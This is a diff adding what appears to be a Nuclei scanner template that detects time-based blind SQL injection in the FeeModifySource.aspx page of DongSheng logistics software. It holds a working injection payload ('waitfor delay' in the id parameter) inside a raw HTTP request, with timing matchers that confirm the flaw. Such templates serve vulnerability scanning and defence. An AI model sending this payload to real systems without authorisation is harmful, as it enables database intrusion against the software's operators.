@@ -1,0 +1,34 @@
+id: poc-dongshengsoft-feemodifysource-aspx-sqli
+info:
+  name: SQL Injection in FeeModifySource.aspx of DongSheng Logistics Software
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /Shipping/FeeModifySource.aspx?handle=apply&applystate=1&checkstate=1&applytype=1&oplb=1&id=1'waitfor+delay'0:0:{{t1}}'--+-&val=b9733091-e978-4cb5-a845-765a82ca1217 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<rows></rows>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
